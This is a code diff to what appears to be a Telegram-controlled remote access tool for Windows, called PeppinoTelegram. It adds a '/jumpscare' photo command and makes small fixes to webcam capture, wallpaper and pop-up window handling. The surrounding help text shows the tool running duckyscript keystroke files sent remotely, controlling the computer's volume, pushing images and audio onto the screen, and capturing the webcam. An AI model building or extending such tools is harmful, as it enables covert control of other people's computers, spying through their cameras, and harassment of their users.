@@ -12,7 +12,7 @@ from PIL import Image
 from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, waitKey,
                  setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                  destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
-                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not, INTER_LINEAR, BORDER_REFLECT, remap)
+                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not, INTER_LINEAR, BORDER_REFLECT, remap, destroyWindow)
 
 #MERGE AUDIO&VIDEO
 from moviepy.editor import AudioFileClip, VideoFileClip
@@ -155,6 +155,7 @@ mute - Set computer's volume to 0.
 full - Set computer's volume to 100.
 
 *sending a photo* - Displays the photo on the screen as a pop-up.
+*sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
 *sending an audio/voice* - Will play the audio/voice in the background.
 *sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)
 
@@ -826,6 +827,7 @@ class PeppinoTelegram:
             imshow("Warning", resize(imread(image_path), (400, 400)))
             setWindowProperty("Warning", WND_PROP_TOPMOST, 1)
             waitKey(0)
+            destroyWindow("Warning")
             remove(image_path)
         except Exception as e:
             self.bsend(f"Error while trying to show image: \n{e}")
@@ -846,6 +848,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         filename = join(BURN_DIRECTORY, "jxframe.png")
         backup_filename = join(BURN_DIRECTORY, "backup.png")
         backup_wallpaper(backup_filename)
+        self.opencap()
         video = VideoCapture(abspath(videofilename))
         while res:
             res, frame = video.read()
@@ -854,8 +857,10 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         change_wallpaper(backup_filename)
         remove(filename)
         remove(backup_filename)
+        self.closecap()
 
     def setCameraAsWallpaper(self, seconds: float|int=5):
+        seconds = int(seconds)
         loading_bar = self.new_loading_bar(label="Set Camera As Wallpaper", total=seconds, showperc=True)
         filename = join(BURN_DIRECTORY, "jxframe.png")
         backup_filename = join(BURN_DIRECTORY, "backup.png")
@@ -871,6 +876,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         loading_bar.set100()
         self.closecap()
         change_wallpaper(backup_filename)
+        sleep(1)
         remove(filename)
         remove(backup_filename)
         loading_bar.delete()
@@ -1167,7 +1173,10 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         if image is None:
             image = self.images[choice(list(self.images.keys()))]
         else:
-            image = self.images[image]
+            if image in self.images:
+                image = self.images[image]
+            else:
+                image = imread(image)
         if audio is None:
             audio = self.audios["ghost-roar"]
         else:
@@ -1215,7 +1224,7 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
 
     """
 
-    def parse_audio(self, msg):
+    def parse_audio(self, msg: dict) -> None:
         if 'voice' in msg:
             file_id = msg['voice']['file_id']
         elif 'audio' in msg:
@@ -1231,15 +1240,19 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         self.__playsound(filepath)
         remove(filepath)
 
-    def parse_photo(self, msg) -> None:
+    def parse_photo(self, msg: dict) -> None:
         filename = randompngname()
         filepath = join(BURN_DIRECTORY, filename)
         self.bot.download_file(msg['photo'][-1]['file_id'], filepath)
+        if "caption" in msg.keys():
+            if msg["caption"] == "/jumpscare":
+                self.jumpscare(filepath)
+                return
         Thread(target=self.show_image, args=[filepath,]).start()
         sleep(0.5)
         remove(filepath)
     
-    def parse_text(self, msg) -> None:
+    def parse_text(self, msg: dict) -> None:
         text = msg["text"]
         if text == "/start":
             return None
